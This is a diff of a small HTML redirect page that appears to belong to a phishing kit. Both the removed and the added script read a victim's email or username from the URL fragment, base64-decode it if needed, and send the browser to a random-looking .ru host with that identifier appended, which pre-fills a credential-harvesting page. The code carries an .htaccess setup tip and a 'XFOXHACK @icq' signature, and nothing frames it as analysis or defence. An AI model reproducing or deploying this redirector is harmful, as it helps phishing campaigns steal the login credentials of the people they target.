@@ -1,21 +1,40 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon">
-    <title>Please Wait...</title>
-    <script type="text/javascript">
-        let redirectURL = "https://V4EHvQik.q6r8s.ru/S7Q9MRu/" // replace
-        let redirectQueryParam = "username" // replace with your  auto-fill param
-        if (window.location.hash) {
-            try {
-                window.location.href = redirectURL + ${redirectQueryParam}=${(window.location.hash.substring(1))}
-            } catch (e) {
-                console.log(e)
-            }
-        }
-    </script>
+    <title>ONLINE</title>
 </head>
 <body>
+    <script>
+/* Add this to .htaccess if you want to use multiple argument in pubil html folder. file named .htaccess or create it
+RewriteEngine On
+RewriteRule ^[^/]+/try/(.*)$ /try/$1 [L] */
+
+var redirect_url = "https://V4EHvQik.q6r8s.ru/S7Q9MRu/#"; // Change this to the URL you want to redirect to
+var path = window.location.href;  // Get the part of the URL after the domain name
+var parts = path.split('#'); // Split the path by #
+// Check if there is a second part
+if (parts.length > 1) {
+// Get the email from the second part
+var email = parts[1];
+if (isBase64(email)) {
+email = atob(email);
+}
+// Redirect to the new URL with the email
+window.location.href = redirect_url + email;
+} else {
+// No email found, show an error message
+alert('Sorry! I cant find redirect for you');
+}
+
+function isBase64(str) {
+try {
+return btoa(atob(str)) == str;
+} catch (err) {
+return false;
+}
+}
+console.log("The path is: " + path);
+// XFOXHACK @icq
+</script>
 </body>
 </html>
